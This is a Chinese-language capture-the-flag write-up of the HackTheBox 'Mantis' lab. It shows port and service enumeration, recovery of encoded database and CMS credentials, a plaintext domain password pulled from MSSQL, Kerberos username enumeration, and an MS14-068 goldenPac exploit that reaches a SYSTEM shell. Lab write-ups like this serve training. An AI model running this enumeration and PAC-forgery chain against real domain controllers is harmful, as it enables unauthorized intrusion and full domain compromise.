# READMS

## 信息收集

### nmap

```shell
sudo nmap -p- --min-rate 10000 10.10.10.52
Password:
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-18 20:13 CST
Warning: 10.10.10.52 giving up on port because retransmission cap hit (10).
Nmap scan report for loaclhost (10.10.10.52)
Host is up (0.14s latency).
Not shown: 64527 closed tcp ports (reset), 981 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1337/tcp  open  waste
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
8080/tcp  open  http-proxy
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49162/tcp open  unknown
49166/tcp open  unknown
50255/tcp open  unknown
62251/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 27.79 seconds

```

```shell
sudo nmap -p 53,88,135,139,389,445,464,593,636,1337,1433,3268,3269,5722,8080,9389 -sC -sV  10.10.10.52
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-18 20:15 CST
Nmap scan report for loaclhost (10.10.10.52)
Host is up (0.12s latency).

PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-18 12:15:23Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1337/tcp open  http         Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
1433/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2023-09-18T12:16:25+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-09-18T11:55:11
|_Not valid after:  2053-09-18T11:55:11
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5722/tcp open  msrpc        Microsoft Windows RPC
8080/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Tossed Salad - Blog
|_http-server-header: Microsoft-IIS/7.5
9389/tcp open  mc-nmf       .NET Message Framing
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   210:
|_    Message signing enabled and required
| smb-os-discovery:
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: mantis
|   NetBIOS computer name: MANTIS\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: mantis.htb.local
|_  System time: 2023-09-18T08:16:14-04:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time:
|   date: 2023-09-18T12:16:18
|_  start_date: 2023-09-18T11:55:03
|_clock-skew: mean: 1h00m00s, deviation: 2h00m00s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.40 seconds

```

### 53端口

```shell
dig axfr @10.10.10.52 htb.local

; <<>> DiG 9.10.6 <<>> axfr @10.10.10.52 htb.local
; (1 server found)
;; global options: +cmd
; Transfer failed.
```



### 135端口

```shell
rpcclient -U "" -N 10.10.10.52
Can't load /opt/homebrew/etc/smb.conf - run testparm to debug it
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> exit
```

### 445端口



```shell
smbmap -H 10.10.10.52 -u "guest"

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 0 SMB session(s)
```

```shell
smbclient -N -L //10.10.10.52/
Can't load /opt/homebrew/etc/smb.conf - run testparm to debug it
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available

```

### web端口

发现两个web端口，1337和8080，而且数据库是sql server。IIS都是7.5版本，似乎都是Orchard Core。

#### 1337

```shell
python3.10 iis_shortname_scan.py http://10.10.10.52:1337/
Server is vulnerable, please wait, scanning...
[+] /a~1.*	[scan in progress]
[+] /s~1.*	[scan in progress]
[+] /as~1.*	[scan in progress]
[+] /se~1.*	[scan in progress]
[+] /asp~1.*	[scan in progress]
[+] /sec~1.*	[scan in progress]
[+] /aspn~1.*	[scan in progress]
[+] /secu~1.*	[scan in progress]
[+] /aspne~1.*	[scan in progress]
[+] /secur~1.*	[scan in progress]
[+] /aspnet~1.*	[scan in progress]
[+] /secure~1.*	[scan in progress]
[+] /aspnet~1	[scan in progress]
[+] Directory /aspnet~1	[Done]
[+] /secure~1	[scan in progress]
[+] Directory /secure~1	[Done]
----------------------------------------------------------------
Dir:  /aspnet~1
Dir:  /secure~1
----------------------------------------------------------------
2 Directories, 0 Files found in total
Note that * is a wildcard, matches any character zero or more times.

```

有个secure开头的目录但是dirsearch没有扫出来，弄一下字典扫出来：

```shell
grep secure /Users/feng/many-ctf/dirbuster/directory-list-lowercase-2.3-medium.txt >temp.txt
python3.10 dirsearch.py -u http://10.10.10.52:1337/ -e '*' -w temp.txt
/Users/feng/ctftools/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, html, htm, js, tar.gz | HTTP method: GET | Threads: 25
Wordlist size: 139

Output: /Users/feng/ctftools/dirsearch/reports/http_10.10.10.52_1337/__23-09-19_10-57-21.txt

Target: http://10.10.10.52:1337/

[10:57:21] Starting:
[10:57:26] 301 -  160B  - /secure_notes  ->  http://10.10.10.52:1337/secure_notes/
```

访问http://10.10.10.52:1337/secure_notes/dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt得到：

```shell
1. Download OrchardCMS
2. Download SQL server 2014 Express ,create user "admin",and create orcharddb database
3. Launch IIS and add new website and point to Orchard CMS folder location.
4. Launch browser and navigate to http://localhost:8080
5. Set admin password and configure sQL server connection string.
6. Add blog pages with admin user.


Credentials stored in secure format
OrchardCMS admin creadentials 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001
SQL Server sa credentials file namez

```

解密得到admin:@dm!n_P@ssW0rd!

（不过最后一句话没懂什么意思）

原来文件名是一串base64，解码得到：

```shell
m$$ql_S@_P@ssW0rd!
```

得到了sa:m$$ql_S@_P@ssW0rd!

#### 8080

登陆界面和admin界面。





### 88端口

```shell
./kerbrute_darwin_amd64 userenum --dc 10.10.10.52 -d htb.local /Users/feng/many-ctf/rockyou.txt

2023/09/19 10:41:45 >  [+] VALID USERNAME:	 james@htb.local
2023/09/19 10:45:17 >  [+] VALID USERNAME:	 JAMES@htb.local
2023/09/19 10:46:33 >  [+] VALID USERNAME:	 administrator@htb.local
2023/09/19 10:48:00 >  [+] VALID USERNAME:	 James@htb.local
2023/09/19 10:48:36 >  [+] VALID USERNAME:	 mantis@htb.local
```



### 1433端口

1433/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM

以sa登录不行，以admin登录就可以：

```shell
python3.10 mssqlclient.py  'admin:m$$ql_S@_P@ssW0rd!@10.10.10.52'
```

登录之后尝试xp_cmdshell发现虽然存在但是权限不够，因为以admin登录上去查看一下权限是public：

```shell
select is_srvrolemember('public')
```

```shell
SQL (admin  admin@master)> select COLUMN_NAME from orcharddb.information_schema.columns where TABLE_NAME='blog_Orchard_Users_UserPartRecord'
COLUMN_NAME
-------------------
Id

UserName

Email

NormalizedUserName

Password

PasswordFormat

HashAlgorithm

PasswordSalt

RegistrationStatus

EmailStatus

EmailChallengeToken

CreatedUtc

LastLoginUtc

LastLogoutUtc

```

直接查询似乎不行：

```shell
select * from orcharddb.blog_Orchard_Users_UserPartRecord
```

查一下当前数据库：

```shell
select db_name()

------
master
```

所以需要跨库查询：

```shell
select * from orcharddb.dbo.blog_Orchard_Users_UserPartRecord
Id   UserName   Email             NormalizedUserName   Password                                                               PasswordFormat   HashAlgorithm   PasswordSalt               RegistrationStatus   EmailStatus   EmailChallengeToken   CreatedUtc            LastLoginUtc          LastLogoutUtc
--   --------   ---------------   ------------------   --------------------------------------------------------------------   --------------   -------------   ------------------------   ------------------   -----------   -------------------   -------------------   -------------------   -------------------
 2   admin                        admin                AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==   Hashed           PBKDF2          UBwWF1CQCsaGc/P7jIR/kg==   Approved             Approved      NULL                  2017-09-01 13:44:01   2017-09-01 14:03:50   2017-09-01 14:06:31

15   James      james@htb.local   james                J@m3s_P@ssW0rd!                                                        Plaintext        Plaintext       NA                         Approved             Approved      NULL                  2017-09-01 13:45:44   NULL                  NULL

```



发现了明文存储的James:J@m3s_P@ssW0rd!，而且这根据88端口的结果，这个用户是一个域内的用户名，而不仅仅是web系统里的用户名。

### 389端口

```shell
ldapsearch -x -b "DC=htb,DC=local"  -s base -h 10.10.10.52
# extended LDIF
#
# LDAPv3
# base <DC=htb,DC=local> with scope baseObject
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C09075A, comment: In order to perform this ope
 ration a successful bind must be completed on the connection., data 0, v1db1

# numResponses: 1
```



```shell
nmap --script "ldap*" -p 389 10.10.10.52
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-19 10:42 CST
NSE: [ldap-brute] passwords: Time limit 10m00s exceeded.
NSE: [ldap-brute] passwords: Time limit 10m00s exceeded.
NSE: [ldap-brute] usernames: Time limit 10m00s exceeded.
Nmap scan report for loaclhost (10.10.10.52)
Host is up (0.15s latency).

Bug in ldap-brute: no string output.
PORT    STATE SERVICE
389/tcp open  ldap
| ldap-rootdse:
| LDAP Results
|   <ROOT>
|       currentTime: 20230919025220.0Z
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=htb,DC=local
|       dsServiceName: CN=NTDS Settings,CN=MANTIS,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
|       namingContexts: DC=htb,DC=local
|       namingContexts: CN=Configuration,DC=htb,DC=local
|       namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
|       namingContexts: DC=DomainDnsZones,DC=htb,DC=local
|       namingContexts: DC=ForestDnsZones,DC=htb,DC=local
|       defaultNamingContext: DC=htb,DC=local
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=htb,DC=local
|       configurationNamingContext: CN=Configuration,DC=htb,DC=local
|       rootDomainNamingContext: DC=htb,DC=local
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       highestCommittedUSN: 135247
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       dnsHostName: mantis.htb.local
|       ldapServiceName: htb.local:mantis$@HTB.LOCAL
|       serverName: CN=MANTIS,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       isSynchronized: TRUE
|       isGlobalCatalogReady: TRUE
|       domainFunctionality: 4
|       forestFunctionality: 4
|_      domainControllerFunctionality: 4
Service Info: Host: MANTIS; OS: Windows 2008 R2

Nmap done: 1 IP address (1 host up) scanned in 601.33 seconds

```

发现mantis.htb.local。



## MS14-068

拿到James:J@m3s_P@ssW0rd!后再一步进行信息收集仍然没有收获，原来是利用MS14-068，他类似于黄金票据，但是不需要知道hash，通过用MD5算法生成伪造的PAC来实现提权。

```shell
python3.10 goldenPac.py -dc-ip 10.10.10.52 -target-ip 10.10.10.52  htb.local/james@mantis.htb.local
```

```shell
C:\Windows\system32>whoami
nt authority\system
```

